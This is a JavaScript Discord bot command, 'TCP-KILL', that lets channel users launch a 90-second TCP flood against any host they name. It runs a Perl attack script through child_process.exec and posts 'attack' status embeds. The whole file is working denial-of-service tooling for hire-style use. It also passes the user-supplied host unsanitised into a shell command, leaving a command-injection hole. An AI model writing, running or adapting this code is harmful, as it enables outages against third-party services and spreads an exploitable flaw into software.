const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('TCP-KILL')
	.setDescription("`example .TCP-KILL 1.1.1.1 `")
	.setFooter("pls don't attack .gov.edu")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`perl TCP-KILL.pl ${host} 443 65500 90`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **TCP-KILL** 🔥')
	.setTimestamp()
	.setDescription("**► attack done 💥**")
	.setFooter('© Developer: MANITA', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 200000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ATTACK BY CRAXSRAT** 🔥')
	.setTimestamp()
  .setDescription("**TCP-KILL**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `TCP-KILL` \n **𝐓𝐢𝐦𝐞**: `90`")	
  .setFooter(' Developer: MANITA', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['TCP-KILL'],
  permLevel: 0
}

exports.help = {
  name: 'TCP-KILL',
  description: 'Tank',
  usage: 'TCP-KILL'
}
